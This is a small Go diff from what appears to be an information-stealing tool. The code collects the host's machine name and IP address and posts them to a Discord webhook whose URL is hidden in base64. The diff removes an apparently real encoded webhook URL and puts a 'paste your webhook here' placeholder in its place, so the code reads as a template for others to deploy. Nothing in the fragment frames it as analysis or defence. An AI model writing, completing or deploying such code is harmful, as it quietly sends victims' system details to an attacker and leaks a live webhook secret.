@@ -54,7 +54,7 @@ func data() {
 	var content = "Machine Name : " + nm + "\n" +
 		"IP Address : " + getit() + "\n"
 
-	var rawDecodedText, err = base64.StdEncoding.DecodeString("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAyMzI1NjI1NDI4MzUxNzk4My9ycWQtaWdramhTU1dKd2FTNGFlcFkxcnZseGV6MTAyeW1xN21pdDhNTlV0V1I5YVdnU0ZodmpPNW1tbGdveXkyNzRFZQ==")
+	var rawDecodedText, err = base64.StdEncoding.DecodeString("PASTE UR BASE 64 ENCODED WEBHOOK HERE")
 
 	message := discordwebhook.Message{
 		Username: &username,
